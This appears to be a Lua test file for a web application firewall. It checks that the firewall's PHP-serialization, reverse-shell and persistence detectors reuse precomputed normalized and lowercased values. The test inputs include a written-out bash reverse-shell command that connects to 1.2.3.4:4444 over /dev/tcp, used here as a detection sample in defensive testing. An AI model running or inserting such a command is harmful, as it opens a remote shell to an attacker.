-- Tests for the per-request memoization threaded into the args/body detectors
-- (audit F58 + F59).
--
-- F58: detect_cmd_param_key/cmd_payload/debug_toggles/php_serialize/bad_utf8 each
--      recomputed normalize(cap(args,max_scan_len)); they now accept a precomputed
--      _na (the shared get_norm_args() memo) and use it instead.
-- F59: detect_reverse_shell + search_rce_markers (persistence/rootkit/lolbin/
--      coinminer) each rebuilt lower(cap(body,max_scan_len)); they now accept a
--      precomputed _bl (the shared get_body_lc() memo).
--
-- The change is behavior-neutral (the memo equals what each detector computes),
-- so a plain behavior test can't distinguish fixed from unfixed. These tests use
-- counting spies to prove the precomputed value is actually USED (helper not
-- recomputed) while the detection result is identical.

package.path = "configs/lua/?.lua;" .. package.path
local det = require("cfm_waf_detectors")

-- The spy normalize/lower are SIMPLIFIED (lowercase only; the real normalize also
-- url-decodes). That is sufficient here: this test proves the precomputed value is
-- USED (0 recompute calls) and that spy-world results match. Real-util byte-parity
-- between the memo and each detector's own computation is covered end-to-end by the
-- WAF severity suite (which drives these detectors through the real cfm_waf.check).
local norm_calls, lower_calls = 0, 0
det.init({ max_scan_len = 2048 }, {
  has      = function(h, n) return h ~= nil and n ~= nil and h:find(n, 1, true) ~= nil end,
  cap      = function(s, n) s = s or ""; if #s > n then return s:sub(1, n) end return s end,
  lower    = function(s) lower_calls = lower_calls + 1; return string.lower(s or "") end,
  normalize = function(s) norm_calls = norm_calls + 1; return string.lower(s or "") end,
  scan_str = function(uri, args) return string.lower((uri or "") .. " " .. (args or "")) end,
})

local fails = 0
local function check(cond, msg)
  if cond then return end
  fails = fails + 1
  io.stderr:write("FAIL: " .. msg .. "\n")
end

-- ── F58: detect_php_serialize — precomputed _na avoids the redundant normalize ─
-- (the spy normalize lowercases, so the precomputed value below matches what the
-- fallback would produce → identical detection).
local SER_ARG = 'O:8:"stdClass":1:{}'
local SER_NA  = string.lower(SER_ARG) -- what normalize(cap(SER_ARG)) yields

norm_calls = 0
check(det.detect_php_serialize(SER_ARG) == "SER_O_PLAIN",
      "F58: detect_php_serialize fallback still detects the object marker")
check(norm_calls >= 1, "F58: fallback path normalizes the args")

norm_calls = 0
check(det.detect_php_serialize(SER_ARG, SER_NA) == "SER_O_PLAIN",
      "F58: precomputed _na yields the identical result")
check(norm_calls == 0, "F58: precomputed _na avoids the redundant normalize (got " .. norm_calls .. ")")

-- A benign arg is a negative in both forms.
norm_calls = 0
check(det.detect_php_serialize("q=hello") == nil, "F58: benign arg -> nil (fallback)")
norm_calls = 0
check(det.detect_php_serialize("q=hello", "q=hello") == nil, "F58: benign arg -> nil (precomputed)")
check(norm_calls == 0, "F58: precomputed _na skips normalize on the benign path too")

-- ── F59a: detect_reverse_shell (inline body-lower) respects _bl ───────────────
local RS_BODY = "bash -i >& /dev/tcp/1.2.3.4/4444 0>&1"

lower_calls = 0
check(det.detect_reverse_shell("/x", "", RS_BODY, "scanua") == "BASH_TCP",
      "F59: detect_reverse_shell fallback detects BASH_TCP")
check(lower_calls >= 1, "F59: fallback lowercases the body")

lower_calls = 0
check(det.detect_reverse_shell("/x", "", RS_BODY, "scanua", string.lower(RS_BODY)) == "BASH_TCP",
      "F59: precomputed _bl yields the identical result")
check(lower_calls == 0, "F59: precomputed _bl avoids re-lowering the body (got " .. lower_calls .. ")")

-- ── F59b: search_rce_markers path (via detect_persistence) respects _bl ───────
lower_calls = 0
det.detect_persistence("/x", "", "benign persistence body", "scanua")
check(lower_calls >= 1, "F59: search_rce_markers fallback lowercases the body")

lower_calls = 0
det.detect_persistence("/x", "", "benign persistence body", "scanua", "precomputed-bl")
check(lower_calls == 0, "F59: search_rce_markers respects the precomputed _bl (got " .. lower_calls .. ")")

if fails > 0 then
  io.stderr:write("\n" .. fails .. " test(s) failed in cfm_waf_memo_test.lua\n")
  os.exit(1)
end
io.stdout:write("ok: WAF per-request args/body memoization (F58 + F59)\n")
